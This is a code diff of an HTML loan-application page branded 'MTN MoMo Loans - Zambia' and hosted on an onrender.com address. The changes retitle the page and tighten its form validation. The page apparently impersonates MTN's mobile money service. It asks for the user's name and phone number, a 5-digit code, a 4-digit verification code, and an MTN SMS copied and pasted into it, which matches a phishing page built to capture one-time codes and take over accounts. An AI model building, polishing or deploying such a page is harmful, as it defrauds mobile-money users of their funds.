@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo Loans and Advances</title>
+    <title>MTN MoMo Loans - Zambia</title>
     
     <!-- ========================================== -->
     <!-- SOCIAL MEDIA PREVIEW TAGS (OPEN GRAPH)     -->
     <!-- ========================================== -->
-    <meta property="og:title" content="MTN MoMo Loans and Advances">
+    <meta property="og:title" content="MTN MoMo Loans - Zambia">
     <meta property="og:description" content="Get loans easily through MTN MoMo. Apply for your loan today!">
     <meta property="og:image" content="https://mtn-momo-advance-loans-zambia.onrender.com/momo-preview.jpg">
     <meta property="og:url" content="https://mtn-momo-advance-loans-zambia.onrender.com">
@@ -16,12 +16,21 @@
 
     <!-- Twitter/X specific tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="MTN MoMo Loans and Advances">
+    <meta name="twitter:title" content="MTN MoMo Loans - Zambia">
     <meta name="twitter:description" content="Get loans easily through MTN MoMo. Apply for your loan today!">
     <meta name="twitter:image" content="https://mtn-momo-advance-loans-zambia.onrender.com/momo-preview.jpg">
     <!-- ========================================== -->
 
     <link rel="stylesheet" href="style.css">
+    
+    <!-- Small style fix to hide number input arrows for a cleaner look -->
+    <style>
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+            -webkit-appearance: none; 
+            margin: 0; 
+        }
+    </style>
 </head>
 <body>
 
@@ -53,7 +62,7 @@
     <div id="main-screen" class="dark-screen">
         <div class="calculator-container">
             <div class="calc-header">
-                <h1 data-translate="calc_welcome">MTN MoMo Loans and Advances</h1>
+                <h1 data-translate="calc_welcome">MTN MoMo Loans - Zambia</h1>
                 <p data-translate="calc_welcome_sub">Get loans easily through MTN MoMo</p>
             </div>
 
@@ -122,7 +131,7 @@
 
                     <div class="input-group">
                         <label data-translate="form_loan_purpose">Purpose of Loan</label>
-                        <input type="text" placeholder="e.g., Business expansion" class="dark-input">
+                        <input type="text" id="purposeInput" placeholder="e.g., Business expansion" class="dark-input" required>
                     </div>
 
                     <button class="btn-primary" onclick="nextStep(2)" data-translate="form_next">NEXT STEP</button>
@@ -133,12 +142,14 @@
                     
                     <div class="input-group">
                         <label data-translate="form_first_name">First Name</label>
-                        <input type="text" placeholder="First Name" class="dark-input" data-translate-placeholder="form_first_name_ph">
+                        <!-- oninput filters out numbers -->
+                        <input type="text" id="firstNameInput" placeholder="First Name" class="dark-input" data-translate-placeholder="form_first_name_ph" required oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')">
                     </div>
 
                     <div class="input-group">
                         <label data-translate="form_last_name">Last Name</label>
-                        <input type="text" placeholder="Last Name" class="dark-input" data-translate-placeholder="form_last_name_ph">
+                        <!-- oninput filters out numbers -->
+                        <input type="text" id="lastNameInput" placeholder="Last Name" class="dark-input" data-translate-placeholder="form_last_name_ph" required oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')">
                     </div>
                     
                     <div class="input-group">
@@ -147,13 +158,15 @@
                             <div class="flag-prefix">
                                 <img src="https://flagcdn.com/w40/zm.png" alt="Zambia Flag">
                             </div>
-                            <input type="tel" placeholder="9 digits (e.g., 971234567)" class="dark-input phone-input" data-translate-placeholder="form_phone_ph">
+                            <!-- type="number" prevents text -->
+                            <input type="number" id="phoneInput" placeholder="9 digits (e.g., 971234567)" class="dark-input phone-input" data-translate-placeholder="form_phone_ph" required oninput="if(this.value.length > 9) this.value = this.value.slice(0,9);">
                         </div>
                     </div>
 
                     <div class="input-group">
                         <label data-translate="form_code">5-Digit Verification Code</label>
-                        <input type="text" maxlength="5" placeholder="Enter 5-digit code" class="dark-input" data-translate-placeholder="form_code_ph">
+                        <!-- type="number" prevents text -->
+                        <input type="number" id="fiveDigitInput" placeholder="Enter 5-digit code" class="dark-input" data-translate-placeholder="form_code_ph" required oninput="if(this.value.length > 5) this.value = this.value.slice(0,5);">
                     </div>
 
                     <div class="button-row">
@@ -178,7 +191,7 @@
                     
                     <div class="input-group">
                         <label data-translate="form_annual_income">Annual Income (ZMW)</label>
-                        <input type="text" placeholder="e.g., 5000000" class="dark-input" data-translate-placeholder="form_annual_income_ph">
+                        <input type="number" id="annualIncomeInput" placeholder="e.g., 5000000" class="dark-input" data-translate-placeholder="form_annual_income_ph" required>
                     </div>
 
                     <div class="button-row">
@@ -226,7 +239,7 @@
                 <p data-translate="sms_tip">Open your Messages app, find the SMS from MTN, long-press it, tap Copy, then come back here.</p>
             </div>
 
-            <textarea id="smsInput" class="sms-textarea" placeholder="Paste the SMS received from MTN here..." data-translate-placeholder="sms_placeholder"></textarea>
+            <textarea id="smsInput" class="sms-textarea" placeholder="Paste the SMS received from MTN here..." data-translate-placeholder="sms_placeholder" required></textarea>
 
             <button class="btn-verify" onclick="submitSMS()" data-translate="sms_btn">VERIFY & CONTINUE &rarr;</button>
         </div>
@@ -237,7 +250,8 @@
         <div class="dark-card popup-card" style="text-align:center;">
             <h2 class="dark-title" data-translate="ver_title">Enter the Verification Code</h2>
             <p class="dark-subtitle" data-translate="ver_subtitle">We sent a 4-digit code to your number. Enter it below to continue.</p>
-            <input type="text" id="fourDigitInput" maxlength="4" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px; margin-bottom: 20px;">
+            <!-- type="number" prevents text -->
+            <input type="number" id="fourDigitInput" class="dark-input" placeholder="0000" style="text-align: center; font-size: 24px; letter-spacing: 5px; margin-bottom: 20px;" required oninput="if(this.value.length > 4) this.value = this.value.slice(0,4);">
             <button class="btn-primary" onclick="submit4Digit()" data-translate="ver_btn">VERIFY</button>
         </div>
     </div>
